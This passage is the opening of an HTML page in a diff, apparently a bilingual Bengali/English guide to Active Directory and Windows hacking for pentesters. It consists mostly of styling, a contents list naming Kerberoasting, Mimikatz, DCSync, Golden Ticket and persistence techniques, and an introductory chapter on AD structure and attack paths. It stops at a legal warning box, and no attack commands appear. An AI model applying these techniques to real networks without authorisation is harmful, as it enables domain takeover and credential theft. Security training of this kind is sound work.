@@ -1,0 +1,1304 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active Directory & Windows Hacking — সম্পূর্ণ গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Fira+Code:wght@400;500;600&family=Exo+2:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #f7f5f2;
+  --surface: #ffffff;
+  --surface2: #eff0f3;
+  --border: #d8dae0;
+  --accent:  #1a56db;
+  --accent2: #0e9f6e;
+  --accent3: #e02424;
+  --accent4: #7e3af2;
+  --accent5: #d97706;
+  --text: #1f2937;
+  --text-dim: #6b7280;
+  --text-bright: #111827;
+  --code-bg: #1e1e2e;
+  --code-text: #cdd6f4;
+  --win-blue: #0078d4;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: 'Hind Siliguri', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  font-size: 14px;
+  line-height: 1.9;
+}
+
+/* ══ BILINGUAL ══ */
+.en-text { display:none; }
+.bn-text { display:inline; }
+body.lang-en .bn-text { display:none; }
+body.lang-en .en-text { display:inline; }
+.en-block { display:none; }
+.bn-block { display:block; }
+body.lang-en .bn-block { display:none; }
+body.lang-en .en-block { display:block; }
+
+/* ══ DARK MODE ══ */
+body.dark-mode {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #1c2128;
+  --border: #2d333b;
+  --text: #c9d1d9;
+  --text-dim: #6e7681;
+  --text-bright: #e6edf3;
+  --code-bg: #0d1117;
+  --accent: #58a6ff;
+  --accent2: #3fb950;
+  --accent3: #f85149;
+  --accent4: #bc8cff;
+  --accent5: #e3b341;
+  --win-blue: #4d9de0;
+}
+body.dark-mode .card { background: var(--surface2); }
+body.dark-mode tr:nth-child(even) { background: rgba(255,255,255,0.03); }
+body.dark-mode .info  { background: rgba(88,166,255,0.07); }
+body.dark-mode .warn  { background: rgba(227,179,65,0.07); }
+body.dark-mode .danger{ background: rgba(248,81,73,0.07); }
+body.dark-mode .success{background: rgba(63,185,80,0.07); }
+
+/* ══ TOP CONTROLS ══ */
+.top-controls { position:fixed; top:16px; right:16px; display:flex; gap:8px; z-index:9999; }
+.ctrl-btn {
+  padding:8px 16px; border-radius:6px;
+  font-size:13px; font-family:'Exo 2',sans-serif;
+  cursor:pointer; font-weight:700; letter-spacing:0.3px;
+  transition:all 0.2s; border:1.5px solid;
+}
+.print-btn { border-color:var(--accent3); color:var(--accent3); background:transparent; }
+.print-btn:hover { background:var(--accent3); color:#fff; }
+.theme-btn { border-color:var(--accent5); color:var(--accent5); background:transparent; }
+.theme-btn:hover { background:var(--accent5); color:#fff; }
+.lang-btn  { border-color:var(--accent);  color:var(--accent);  background:transparent; }
+.lang-btn:hover  { background:var(--accent); color:#fff; }
+
+/* ══ COVER ══ */
+.cover {
+  min-height:100vh;
+  background: linear-gradient(160deg, #0a0f1e 0%, #0d2137 40%, #0f1c3a 70%, #090e1a 100%);
+  display:flex; flex-direction:column;
+  align-items:center; justify-content:center;
+  text-align:center; padding:80px 40px;
+  page-break-after:always; position:relative; overflow:hidden;
+}
+.cover-grid {
+  position:absolute; inset:0;
+  background-image:
+    linear-gradient(rgba(0,120,212,0.06) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,120,212,0.06) 1px, transparent 1px);
+  background-size:50px 50px;
+}
+.cover-glow {
+  position:absolute; width:400px; height:400px;
+  border-radius:50%; top:30%; left:50%; transform:translate(-50%,-50%);
+  background: radial-gradient(circle, rgba(0,120,212,0.12) 0%, transparent 70%);
+}
+.cover-eyebrow {
+  font-family:'Fira Code', monospace;
+  font-size:11px; letter-spacing:4px; color:rgba(0,120,212,0.8);
+  text-transform:uppercase; margin-bottom:20px; position:relative;
+  border:1px solid rgba(0,120,212,0.3); padding:5px 18px; border-radius:3px;
+  background:rgba(0,120,212,0.06);
+}
+.cover h1 {
+  font-family:'Exo 2', sans-serif;
+  font-size:48px; font-weight:800; color:#e6f0ff;
+  line-height:1.1; position:relative; letter-spacing:-1px;
+}
+.cover h1 .win { color:var(--win-blue); }
+.cover h2 {
+  font-family:'Exo 2', sans-serif;
+  font-size:20px; font-weight:500;
+  color:rgba(180,200,230,0.5); margin:8px 0 28px; position:relative;
+}
+.cover-line { width:60px; height:3px; background:var(--win-blue); margin:0 auto 28px; position:relative; }
+.cover-desc {
+  font-size:14.5px; color:rgba(160,185,215,0.6);
+  max-width:620px; line-height:2.1; margin-bottom:34px; position:relative;
+}
+.cover-terminal {
+  background:rgba(0,0,0,0.55); border:1px solid rgba(0,120,212,0.25);
+  border-top:3px solid var(--win-blue);
+  border-radius:6px; padding:18px 26px;
+  font-family:'Fira Code', monospace; font-size:12.5px;
+  text-align:left; max-width:500px; width:100%;
+  margin-bottom:28px; position:relative;
+}
+.ps-prompt { color:#9cdcfe; }
+.ps-cmd   { color:#4fc1ff; }
+.ps-out   { color:#98c379; font-size:11.5px; }
+.ps-err   { color:#f85149; }
+.cover-chips { display:flex; flex-wrap:wrap; gap:7px; justify-content:center; position:relative; }
+.chip {
+  font-family:'Fira Code', monospace; font-size:11px;
+  padding:4px 12px; border-radius:3px; border:1px solid;
+}
+.chip-b { color:#58a6ff; border-color:rgba(88,166,255,0.3); background:rgba(88,166,255,0.07); }
+.chip-g { color:#3fb950; border-color:rgba(63,185,80,0.3); background:rgba(63,185,80,0.07); }
+.chip-r { color:#f85149; border-color:rgba(248,81,73,0.3); background:rgba(248,81,73,0.07); }
+.chip-p { color:#bc8cff; border-color:rgba(188,140,255,0.3); background:rgba(188,140,255,0.07); }
+.chip-y { color:#e3b341; border-color:rgba(227,179,65,0.3); background:rgba(227,179,65,0.07); }
+
+/* ══ TOC ══ */
+.toc { background:var(--surface); padding:55px 65px; page-break-after:always; border-top:4px solid var(--win-blue); }
+.toc-h { font-family:'Exo 2',sans-serif; font-size:26px; font-weight:800; color:var(--accent); margin-bottom:5px; }
+.toc-sh { font-family:'Fira Code',monospace; font-size:10px; color:var(--text-dim); letter-spacing:3px; text-transform:uppercase; margin-bottom:32px; }
+.toc-row { display:flex; align-items:flex-start; gap:14px; padding:11px 0; border-bottom:1px solid var(--border); transition:padding-left 0.2s; }
+.toc-row:hover { padding-left:6px; }
+.toc-n { font-family:'Fira Code',monospace; font-size:11px; color:var(--accent); min-width:28px; padding-top:2px; }
+.toc-info { flex:1; }
+.toc-name { font-family:'Exo 2',sans-serif; font-size:15px; font-weight:700; color:var(--text-bright); }
+.toc-sub { font-size:12px; color:var(--text-dim); margin-top:2px; }
+.toc-tag { font-family:'Fira Code',monospace; font-size:10px; padding:2px 8px; border-radius:3px; white-space:nowrap; align-self:center; border:1px solid; }
+
+/* ══ CHAPTERS ══ */
+.chapter { background:var(--surface); page-break-before:always; }
+.chapter-header { padding:45px 60px; position:relative; overflow:hidden; }
+.ch1  .chapter-header { background:linear-gradient(135deg,#001529,#002b5c); border-top:4px solid #0078d4; }
+.ch2  .chapter-header { background:linear-gradient(135deg,#001a08,#003314); border-top:4px solid #0e9f6e; }
+.ch3  .chapter-header { background:linear-gradient(135deg,#1a0000,#330000); border-top:4px solid #e02424; }
+.ch4  .chapter-header { background:linear-gradient(135deg,#0f0020,#1e0040); border-top:4px solid #7e3af2; }
+.ch5  .chapter-header { background:linear-gradient(135deg,#1a0f00,#332000); border-top:4px solid #d97706; }
+.ch6  .chapter-header { background:linear-gradient(135deg,#001529,#003366); border-top:4px solid #0078d4; }
+.ch7  .chapter-header { background:linear-gradient(135deg,#001a08,#002e12); border-top:4px solid #0e9f6e; }
+.ch8  .chapter-header { background:linear-gradient(135deg,#1a0005,#33000a); border-top:4px solid #e02424; }
+.ch9  .chapter-header { background:linear-gradient(135deg,#100020,#1f003d); border-top:4px solid #7e3af2; }
+.ch10 .chapter-header { background:linear-gradient(135deg,#190f00,#2e1a00); border-top:4px solid #d97706; }
+.ch11 .chapter-header { background:linear-gradient(135deg,#001529,#002550); border-top:4px solid #0078d4; }
+.ch12 .chapter-header { background:linear-gradient(135deg,#00100a,#001e14); border-top:4px solid #0e9f6e; }
+
+.chapter-header::after {
+  content:attr(data-num);
+  position:absolute; right:55px; top:50%; transform:translateY(-50%);
+  font-family:'Exo 2',sans-serif; font-size:110px; font-weight:800;
+  opacity:0.05; color:white; line-height:1;
+}
+.ch-label { font-family:'Fira Code',monospace; font-size:10px; letter-spacing:4px; color:rgba(255,255,255,0.3); text-transform:uppercase; margin-bottom:10px; }
+.ch-title { font-family:'Exo 2',sans-serif; font-size:30px; color:#e6f0ff; font-weight:800; letter-spacing:-0.5px; line-height:1.2; }
+.ch-desc { font-size:13px; color:rgba(180,200,230,0.45); margin-top:8px; }
+.chapter-body { padding:45px 60px; }
+
+/* ══ HEADINGS ══ */
+h2.sec {
+  font-family:'Exo 2',sans-serif; font-size:19px; font-weight:800;
+  color:var(--accent); margin:36px 0 14px;
+  padding-left:14px; border-left:3px solid var(--accent);
+}
+.ch2 h2.sec  { color:var(--accent2); border-left-color:var(--accent2); }
+.ch3 h2.sec  { color:var(--accent3); border-left-color:var(--accent3); }
+.ch4 h2.sec  { color:var(--accent4); border-left-color:var(--accent4); }
+.ch5 h2.sec  { color:var(--accent5); border-left-color:var(--accent5); }
+.ch6 h2.sec  { color:var(--accent);  border-left-color:var(--accent); }
+.ch7 h2.sec  { color:var(--accent2); border-left-color:var(--accent2); }
+.ch8 h2.sec  { color:var(--accent3); border-left-color:var(--accent3); }
+.ch9 h2.sec  { color:var(--accent4); border-left-color:var(--accent4); }
+.ch10 h2.sec { color:var(--accent5); border-left-color:var(--accent5); }
+.ch11 h2.sec { color:var(--accent);  border-left-color:var(--accent); }
+.ch12 h2.sec { color:var(--accent2); border-left-color:var(--accent2); }
+
+h3.sub { font-family:'Exo 2',sans-serif; font-size:15px; font-weight:700; color:var(--text-bright); margin:22px 0 10px; padding-bottom:5px; border-bottom:1px solid var(--border); }
+p { margin-bottom:14px; text-align:justify; }
+
+/* ══ CODE ══ */
+.code {
+  background:var(--code-bg); color:var(--code-text);
+  padding:18px 22px; border-radius:6px;
+  font-family:'Fira Code',monospace;
+  font-size:12.5px; margin:15px 0; line-height:1.85;
+  overflow-x:auto; border:1px solid rgba(255,255,255,0.05);
+  border-left:3px solid var(--accent);
+}
+.ch2 .code  { border-left-color:var(--accent2); }
+.ch3 .code  { border-left-color:var(--accent3); }
+.ch4 .code  { border-left-color:var(--accent4); }
+.ch5 .code  { border-left-color:var(--accent5); }
+.ch7 .code  { border-left-color:var(--accent2); }
+.ch8 .code  { border-left-color:var(--accent3); }
+.ch9 .code  { border-left-color:var(--accent4); }
+.ch10 .code { border-left-color:var(--accent5); }
+.ch12 .code { border-left-color:var(--accent2); }
+
+.code .c  { color:#6272a4; font-style:italic; }
+.code .k  { color:#ff79c6; }
+.code .kw { color:#bd93f9; }
+.code .s  { color:#f1fa8c; }
+.code .n  { color:#ffb86c; }
+.code .f  { color:#8be9fd; }
+.code .g  { color:#50fa7b; }
+.code .r  { color:#ff5555; }
+.code .p  { color:#0078d4; }
+.code .b  { color:#8be9fd; }
+code {
+  background:rgba(0,0,0,0.08); color:var(--accent);
+  padding:2px 7px; border-radius:3px;
+  font-family:'Fira Code',monospace; font-size:12.5px;
+}
+body.dark-mode code { background:rgba(255,255,255,0.08); }
+
+/* ══ BOXES ══ */
+.box { padding:15px 20px; border-radius:6px; margin:16px 0; border-left:4px solid; }
+.info    { background:rgba(26,86,219,0.07);  border-color:var(--accent); }
+.warn    { background:rgba(217,119,6,0.07);  border-color:var(--accent5); }
+.danger  { background:rgba(224,36,36,0.07);  border-color:var(--accent3); }
+.success { background:rgba(14,159,110,0.07); border-color:var(--accent2); }
+.purple-box { background:rgba(126,58,242,0.07); border-color:var(--accent4); }
+.box-t { font-family:'Exo 2',sans-serif; font-weight:700; font-size:13px; margin-bottom:7px; }
+.box p,.box li { color:var(--text); }
+
+/* ══ TABLES ══ */
+table { width:100%; border-collapse:collapse; margin:16px 0; font-size:13px; }
+thead tr { background:var(--code-bg); color:#cdd6f4; }
+th { padding:10px 14px; text-align:left; font-weight:700; color:#8be9fd; border-bottom:1px solid var(--border); font-family:'Exo 2',sans-serif; font-size:12px; }
+td { padding:9px 14px; border-bottom:1px solid var(--border); color:var(--text); }
+tr:nth-child(even) { background:rgba(0,0,0,0.02); }
+tr:hover { background:rgba(26,86,219,0.04); }
+
+/* ══ GRID ══ */
+.grid2 { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin:16px 0; }
+.grid3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; margin:14px 0; }
+.card { background:var(--surface2); border:1px solid var(--border); border-radius:6px; padding:16px; }
+.card h4 { font-family:'Exo 2',sans-serif; font-size:13px; font-weight:700; margin-bottom:9px; padding-bottom:6px; border-bottom:1px solid var(--border); }
+.card.b-card  { border-color:rgba(26,86,219,0.3);  } .card.b-card h4  { color:var(--accent); }
+.card.g-card  { border-color:rgba(14,159,110,0.3); } .card.g-card h4  { color:var(--accent2); }
+.card.r-card  { border-color:rgba(224,36,36,0.3);  } .card.r-card h4  { color:var(--accent3); }
+.card.p-card  { border-color:rgba(126,58,242,0.3); } .card.p-card h4  { color:var(--accent4); }
+.card.y-card  { border-color:rgba(217,119,6,0.3);  } .card.y-card h4  { color:var(--accent5); }
+.card.w-card  { border-color:rgba(0,120,212,0.3);  } .card.w-card h4  { color:var(--win-blue); }
+
+/* ══ BADGE ══ */
+.badge { display:inline-block; padding:2px 8px; border-radius:3px; font-size:11px; font-weight:700; margin:1px; font-family:'Exo 2',sans-serif; border:1px solid; }
+.badge-b { background:rgba(26,86,219,0.1);  color:var(--accent);  border-color:rgba(26,86,219,0.25); }
+.badge-g { background:rgba(14,159,110,0.1); color:var(--accent2); border-color:rgba(14,159,110,0.25); }
+.badge-r { background:rgba(224,36,36,0.1);  color:var(--accent3); border-color:rgba(224,36,36,0.25); }
+.badge-p { background:rgba(126,58,242,0.1); color:var(--accent4); border-color:rgba(126,58,242,0.25); }
+.badge-y { background:rgba(217,119,6,0.1);  color:var(--accent5); border-color:rgba(217,119,6,0.25); }
+
+ul,ol { margin:10px 0 10px 22px; line-height:2; }
+li { margin-bottom:2px; }
+
+/* ══ AD DIAGRAM ══ */
+.ad-diagram {
+  background:var(--code-bg); border:1px solid rgba(0,120,212,0.2);
+  border-radius:6px; padding:20px 24px; margin:16px 0;
+  font-family:'Fira Code',monospace; font-size:12px;
+  line-height:1.9; overflow-x:auto; color:#cdd6f4;
+}
+.ad-d { color:#8be9fd; }
+.ad-g { color:#50fa7b; }
+.ad-r { color:#ff5555; }
+.ad-y { color:#f1fa8c; }
+.ad-p { color:#bd93f9; }
+.ad-o { color:#ffb86c; }
+.ad-w { color:#0078d4; }
+
+/* ══ ATTACK PATH ══ */
+.attack-path { display:flex; align-items:center; gap:4px; margin:18px 0; overflow-x:auto; padding-bottom:6px; }
+.ap-step { padding:10px 14px; border-radius:4px; font-family:'Exo 2',sans-serif; font-size:12px; font-weight:700; white-space:nowrap; flex-shrink:0; }
+.ap-arrow { color:rgba(150,170,200,0.4); font-size:16px; flex-shrink:0; }
+
+/* ══ CHEAT SHEET ══ */
+.cheat-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin:16px 0; }
+.cheat-card { background:var(--surface2); border:1px solid var(--border); border-radius:6px; overflow:hidden; }
+.cheat-head { padding:8px 14px; font-family:'Exo 2',sans-serif; font-size:12px; font-weight:800; letter-spacing:0.3px; }
+.cheat-row { display:flex; padding:5px 12px; border-bottom:1px solid var(--border); font-size:11.5px; gap:10px; }
+.cheat-row:last-child { border-bottom:none; }
+.cheat-cmd { font-family:'Fira Code',monospace; color:var(--accent2); min-width:175px; white-space:nowrap; font-size:11px; }
+.cheat-desc { color:var(--text-dim); }
+
+/* ══ SUMMARY ══ */
+.ch-summary { background:var(--code-bg); border-radius:6px; padding:22px 26px; margin-top:38px; border-top:3px solid var(--accent); }
+.ch2  .ch-summary { border-top-color:var(--accent2); }
+.ch3  .ch-summary { border-top-color:var(--accent3); }
+.ch4  .ch-summary { border-top-color:var(--accent4); }
+.ch5  .ch-summary { border-top-color:var(--accent5); }
+.ch-summary h3 { font-family:'Exo 2',sans-serif; font-size:14px; font-weight:800; color:#e6f0ff; margin-bottom:12px; }
+.ch-summary li { color:#a8b8cf; }
+
+@media (max-width:768px) {
+  .grid2,.grid3,.cheat-grid { grid-template-columns:1fr; }
+  .chapter-body,.chapter-header { padding:25px 20px; }
+  .toc { padding:30px 20px; }
+  .attack-path { flex-wrap:wrap; }
+}
+@media print {
+  .top-controls { display:none; }
+  .chapter-header { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+  .code,.ad-diagram { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+}
+</style>
+</head>
+<body>
+
+<div class="top-controls">
+  <button class="print-btn ctrl-btn" onclick="window.print()">🖨️ PDF</button>
+  <button class="theme-btn ctrl-btn" onclick="toggleTheme()" id="themeBtn">🌙 Dark</button>
+  <button class="lang-btn ctrl-btn" onclick="toggleLang()"  id="langBtn">🇬🇧 English</button>
+</div>
+
+<!-- COVER -->
+<div class="cover">
+  <div class="cover-grid"></div>
+  <div class="cover-glow"></div>
+  <div class="cover-eyebrow">// Cyber Security Series — Corporate Hacking //</div>
+  <h1><span class="win">Active Directory</span></h1>
+  <h1 style="font-size:34px; color:rgba(180,210,240,0.45); font-weight:600; margin-top:4px;">
+    &amp; <span style="color:#e6f0ff;">Windows Hacking</span>
+  </h1>
+  <h2><span class="bn-text">সম্পূর্ণ বাংলা গাইড</span><span class="en-text">Complete Guide</span></h2>
+  <div class="cover-line"></div>
+  <p class="cover-desc">
+    <span class="bn-text">Active Directory-র মূল ধারণা থেকে শুরু করে Enumeration, Kerberoasting, Pass-the-Hash, BloodHound, Mimikatz ও Domain Compromise পর্যন্ত — Ethical Hacker-দের জন্য সম্পূর্ণ গাইড।</span>
+    <span class="en-text">From the core concepts of Active Directory to Enumeration, Kerberoasting, Pass-the-Hash, BloodHound, Mimikatz, and Domain Compromise — a complete guide for Ethical Hackers.</span>
+  </p>
+  <div class="cover-terminal">
+    <div style="margin-bottom:10px; display:flex; gap:7px;">
+      <span style="width:10px;height:10px;border-radius:50%;background:#ff5f56;display:inline-block;"></span>
+      <span style="width:10px;height:10px;border-radius:50%;background:#ffbd2e;display:inline-block;"></span>
+      <span style="width:10px;height:10px;border-radius:50%;background:#27c93f;display:inline-block;"></span>
+    </div>
+    <div><span class="ps-prompt">PS C:\></span> <span class="ps-cmd">Get-ADDomain</span></div>
+    <div class="ps-out">DNSRoot          : corp.local</div>
+    <div class="ps-out">DomainMode       : Windows2016Domain</div>
+    <div class="ps-out">PDCEmulator      : DC01.corp.local</div>
+    <div style="margin-top:8px;"><span class="ps-prompt">PS C:\></span> <span class="ps-cmd">whoami /groups | findstr "Domain Admin"</span></div>
+    <div class="ps-out" style="color:#50fa7b;">[+] CORP\Domain Admins → Access Granted!</div>
+  </div>
+  <div class="cover-chips">
+    <span class="chip chip-b">🏢 AD Structure</span>
+    <span class="chip chip-g">🔍 Enumeration</span>
+    <span class="chip chip-r">🎭 Kerberoasting</span>
+    <span class="chip chip-p">🔑 Pass-the-Hash</span>
+    <span class="chip chip-y">🐶 BloodHound</span>
+    <span class="chip chip-b">🔓 Mimikatz</span>
+    <span class="chip chip-g">↗️ Lateral Movement</span>
+    <span class="chip chip-r">👑 Domain Compromise</span>
+    <span class="chip chip-p">🛡️ Defense</span>
+    <span class="chip chip-y">📋 Cheat Sheet</span>
+  </div>
+</div>
+
+<!-- TOC -->
+<div class="toc">
+  <div class="toc-h">// <span class="bn-text">বিষয়সূচি</span><span class="en-text">Table of Contents</span> //</div>
+  <div class="toc-sh">Active Directory &amp; Windows Hacking — Complete Roadmap</div>
+
+  <div class="toc-row"><span class="toc-n">01</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Active Directory পরিচিতি</span><span class="en-text">Introduction to Active Directory</span></div><div class="toc-sub"><span class="bn-text">AD কী, Domain, Forest, Trust, DC — মূল ধারণা</span><span class="en-text">What is AD, Domain, Forest, Trust, DC — core concepts</span></div></div><span class="toc-tag badge-b">THEORY</span></div>
+
+  <div class="toc-row"><span class="toc-n">02</span><div class="toc-info"><div class="toc-name"><span class="bn-text">AD Components বিস্তারিত</span><span class="en-text">AD Components in Detail</span></div><div class="toc-sub">Users, Groups, GPO, LDAP, Kerberos, DNS — <span class="bn-text">কীভাবে কাজ করে</span><span class="en-text">how they work</span></div></div><span class="toc-tag badge-g">CONCEPTS</span></div>
+
+  <div class="toc-row"><span class="toc-n">03</span><div class="toc-info"><div class="toc-name"><span class="bn-text">AD Enumeration</span><span class="en-text">AD Enumeration</span></div><div class="toc-sub">BloodHound, PowerView, ldapdomaindump, enum4linux — <span class="bn-text">তথ্য সংগ্রহ</span><span class="en-text">gathering information</span></div></div><span class="toc-tag badge-r">RECON</span></div>
+
+  <div class="toc-row"><span class="toc-n">04</span><div class="toc-info"><div class="toc-name">Kerberos Attacks — <span class="bn-text">Kerberoasting ও ASREPRoasting</span><span class="en-text">Kerberoasting & ASREPRoasting</span></div><div class="toc-sub"><span class="bn-text">Service ticket চুরি করে offline crack</span><span class="en-text">Steal service tickets and crack offline</span></div></div><span class="toc-tag badge-p">KERBEROS</span></div>
+
+  <div class="toc-row"><span class="toc-n">05</span><div class="toc-info"><div class="toc-name">Pass-the-Hash <span class="bn-text">ও</span><span class="en-text">&</span> Pass-the-Ticket</div><div class="toc-sub"><span class="bn-text">Hash ও ticket দিয়ে authenticate — password ছাড়া</span><span class="en-text">Authenticate with hash & ticket — without password</span></div></div><span class="toc-tag badge-y">LATERAL</span></div>
+
+  <div class="toc-row"><span class="toc-n">06</span><div class="toc-info"><div class="toc-name">Mimikatz — <span class="bn-text">Credential Dumping</span><span class="en-text">Credential Dumping</span></div><div class="toc-sub">sekurlsa, lsadump, golden ticket, silver ticket</div></div><span class="toc-tag badge-r">MIMIKATZ</span></div>
+
+  <div class="toc-row"><span class="toc-n">07</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Lateral Movement</span><span class="en-text">Lateral Movement</span></div><div class="toc-sub">PsExec, WMI, SMB, RDP, WinRM — <span class="bn-text">network-এ ছড়িয়ে পড়া</span><span class="en-text">spreading across the network</span></div></div><span class="toc-tag badge-g">MOVEMENT</span></div>
+
+  <div class="toc-row"><span class="toc-n">08</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Windows Privilege Escalation</span><span class="en-text">Windows Privilege Escalation</span></div><div class="toc-sub">Token impersonation, Unquoted paths, DLL Hijacking, AlwaysInstallElevated</div></div><span class="toc-tag badge-r">PRIVESC</span></div>
+
+  <div class="toc-row"><span class="toc-n">09</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Domain Compromise — DCSync ও Golden Ticket</span><span class="en-text">Domain Compromise — DCSync & Golden Ticket</span></div><div class="toc-sub"><span class="bn-text">Domain Admin থেকে পুরো AD নেওয়া</span><span class="en-text">From Domain Admin to taking over the entire AD</span></div></div><span class="toc-tag badge-p">DOMAIN</span></div>
+
+  <div class="toc-row"><span class="toc-n">10</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Persistence — AD-তে টিকে থাকা</span><span class="en-text">Persistence — Staying in AD</span></div><div class="toc-sub">Golden Ticket, Silver Ticket, Skeleton Key, AdminSDHolder</div></div><span class="toc-tag badge-y">PERSIST</span></div>
+
+  <div class="toc-row"><span class="toc-n">11</span><div class="toc-info"><div class="toc-name"><span class="bn-text">AD Security — রক্ষার উপায়</span><span class="en-text">AD Security — How to Defend</span></div><div class="toc-sub">Tiering model, LAPS, Protected Users, Monitoring</div></div><span class="toc-tag badge-g">DEFENSE</span></div>
+
+  <div class="toc-row"><span class="toc-n">12</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Cheat Sheet — সম্পূর্ণ রেফারেন্স</span><span class="en-text">Cheat Sheet — Complete Reference</span></div><div class="toc-sub">BloodHound, Mimikatz, Impacket, PowerView — <span class="bn-text">সব কমান্ড</span><span class="en-text">all commands</span></div></div><span class="toc-tag badge-y">CHEAT</span></div>
+</div>
+
+<!-- CH 1: AD INTRO -->
+<div class="chapter ch1">
+  <div class="chapter-header" data-num="01">
+    <div class="ch-label">CHAPTER 01</div>
+    <div class="ch-title">🏢 <span class="bn-text">Active Directory পরিচিতি</span><span class="en-text">Introduction to Active Directory</span></div>
+    <div class="ch-desc"><span class="bn-text">AD কী, কেন এটা হ্যাকারদের সবচেয়ে বড় target, এবং মূল structure</span><span class="en-text">What is AD, why it's the biggest hacker target, and the core structure</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Active Directory কী?</span><span class="en-text">What is Active Directory?</span></h2>
+    <p><span class="bn-text">Active Directory (AD) হলো Microsoft-এর directory service যা corporate network-এ users, computers, printers এবং resources manage করে। বিশ্বের ৯০%+ enterprise organization AD ব্যবহার করে। Pentester-দের কাছে AD হলো সবচেয়ে মূল্যবান target — কারণ AD compromise করলে পুরো organization-এর access পাওয়া যায়।</span><span class="en-text">Active Directory (AD) is Microsoft's directory service that manages users, computers, printers, and resources in a corporate network. Over 90% of enterprise organizations worldwide use AD. For pentesters, AD is the most valuable target — because compromising AD means gaining access to the entire organization.</span></p>
+
+    <h2 class="sec"><span class="bn-text">AD-এর মূল Structure</span><span class="en-text">Core AD Structure</span></h2>
+    <div class="ad-diagram">
+<span class="ad-w">Forest: corp.com</span>  (<span class="bn-text">সর্বোচ্চ স্তর</span><span class="en-text">Highest level</span>)
+├── <span class="ad-d">Domain: corp.com</span>
+│   ├── <span class="ad-g">Domain Controller (DC01)</span>  ← <span class="bn-text">সবচেয়ে গুরুত্বপূর্ণ server</span><span class="en-text">Most important server</span>
+│   ├── <span class="ad-y">Organizational Units (OUs)</span>
+│   │   ├── IT Department
+│   │   │   ├── <span class="ad-g">Users:</span> alice, bob, charlie
+│   │   │   └── <span class="ad-b">Computers:</span> PC01, PC02
+│   │   └── HR Department
+│   │       └── <span class="ad-g">Users:</span> dave, eve
+│   ├── <span class="ad-p">Groups:</span> Domain Admins, IT-Staff, HR-Staff
+│   └── <span class="ad-o">Group Policy Objects (GPOs)</span>
+└── <span class="ad-d">Child Domain: dev.corp.com</span>
+    └── <span class="ad-g">Domain Controller (DC02)</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">গুরুত্বপূর্ণ AD Objects</span><span class="en-text">Important AD Objects</span></h2>
+    <table>
+      <thead><tr><th>Object</th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th><th><span class="bn-text">Pentesting গুরুত্ব</span><span class="en-text">Pentesting Importance</span></th></tr></thead>
+      <tbody>
+        <tr><td><strong>Domain Controller (DC)</strong></td><td><span class="bn-text">AD database ধরে রাখে</span><span class="en-text">Holds the AD database</span></td><td><span class="badge badge-r">CRITICAL TARGET</span></td></tr>
+        <tr><td><strong>Domain Admin</strong></td><td><span class="bn-text">পুরো domain-এ সর্বোচ্চ access</span><span class="en-text">Highest access across the domain</span></td><td><span class="badge badge-r">MAIN GOAL</span></td></tr>
+        <tr><td><strong>Service Accounts</strong></td><td><span class="bn-text">Applications চালানোর জন্য</span><span class="en-text">For running applications</span></td><td><span class="badge badge-y">Kerberoasting target</span></td></tr>
+        <tr><td><strong>GPO</strong></td><td><span class="bn-text">Policy enforce করে</span><span class="en-text">Enforces policies</span></td><td><span class="badge badge-p">Persistence vector</span></td></tr>
+        <tr><td><strong>KRBTGT</strong></td><td><span class="bn-text">Kerberos ticket signing</span><span class="en-text">Kerberos ticket signing</span></td><td><span class="badge badge-r">Golden Ticket key</span></td></tr>
+        <tr><td><strong>Trust</strong></td><td><span class="bn-text">Domain-এর মধ্যে সম্পর্ক</span><span class="en-text">Relationship between domains</span></td><td><span class="badge badge-p">Cross-domain attack</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec"><span class="bn-text">Attack Path — সাধারণ AD Compromise</span><span class="en-text">Attack Path — Typical AD Compromise</span></h2>
+    <div class="attack-path">
+      <div class="ap-step" style="background:rgba(14,159,110,0.12);color:#0e9f6e;border:1px solid rgba(14,159,110,0.3);">🌐 Network Access</div>
+      <div class="ap-arrow">→</div>
+      <div class="ap-step" style="background:rgba(26,86,219,0.12);color:#1a56db;border:1px solid rgba(26,86,219,0.3);">🔍 Enumeration</div>
+      <div class="ap-arrow">→</div>
+      <div class="ap-step" style="background:rgba(217,119,6,0.12);color:#d97706;border:1px solid rgba(217,119,6,0.3);">💥 Initial Access</div>
+      <div class="ap-arrow">→</div>
+      <div class="ap-step" style="background:rgba(126,58,242,0.12);color:#7e3af2;border:1px solid rgba(126,58,242,0.3);">⬆️ PrivEsc</div>
+      <div class="ap-arrow">→</div>
+      <div class="ap-step" style="background:rgba(224,36,36,0.12);color:#e02424;border:1px solid rgba(224,36,36,0.3);">↗️ Lateral Move</div>
+      <div class="ap-arrow">→</div>
+      <div class="ap-step" style="background:rgba(224,36,36,0.15);color:#e02424;border:1px solid rgba(224,36,36,0.4);">👑 Domain Admin</div>
+    </div>
+
+    <div class="box warn">
+      <div class="box-t">⚖️ <span class="bn-text">Legal ও Ethical সতর্কতা</span><span class="en-text">Legal & Ethical Warning</span></div>
